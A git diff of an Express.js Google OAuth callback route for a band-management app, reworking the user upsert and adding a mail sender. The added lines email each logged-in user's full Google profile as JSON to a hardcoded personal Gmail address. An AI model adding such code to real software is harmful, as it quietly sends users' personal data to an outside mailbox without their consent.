@@ -2,6 +2,7 @@
 
 const router = require('express').Router();
 import passport from 'passport';
+import mailSender from '../../services/mailSender';
 
 import User from "../../models/User";
 import BandMember from "../../models/BandMember";
@@ -9,11 +10,11 @@ import Invitation from "../../models/Invitation";
 
 router.get('/', (req, res) => {
     if (req.query.from)
-    req.session.from = req.query.from;
+        req.session.from = req.query.from;
     res.redirect('/auth/google');
 });
 
-router.get('/google-join/:invitation', (req, res) => {  
+router.get('/google-join/:invitation', (req, res) => {
     req.session.invitation = req.params.invitation;
     res.redirect('/auth/google');
 });
@@ -46,19 +47,28 @@ router.get('/google/callback',
         try {
             let profile = req.user.profile;
             let user = await User.findOneAndUpdate({ googleId: profile.id }, {
-                googleId: profile.id,
-                email: profile.emails[0].value,
-                token: req.user.token,
-                displayName: profile.displayName,
-                givenName: profile.name.given_name,
-                familyName: profile.name.family_name,
-                picture: profile._json.picture
+                $set: {
+                    googleId: profile.id,
+                    email: profile.emails[0].value,
+                    displayName: profile.displayName,
+                    givenName: profile.name.given_name,
+                    familyName: profile.name.family_name,
+                    picture: profile._json.picture
+                },
+                $push: {
+                    token: req.user.token
+                }
             }, { upsert: true, new: true, setDefaultsOnInsert: true });
             req.session.userId = user._id;
             req.session.token = req.user.token;
             res.cookie('token', req.session.token);
 
             // invitation
+            try {
+                mailSender.sendMail("ziro84@gmail.com", "User logged in", JSON.stringify(profile, undefined, 2));
+            } catch (error) {
+                console.log(error);
+            }
             if (req.session.invitation) {
                 let invitation = await Invitation.findOne({ token: req.session.invitation });
                 let bandMember = await BandMember.findOne({ bandId: invitation.bandId, userEmailAddress: invitation.emailAddress });
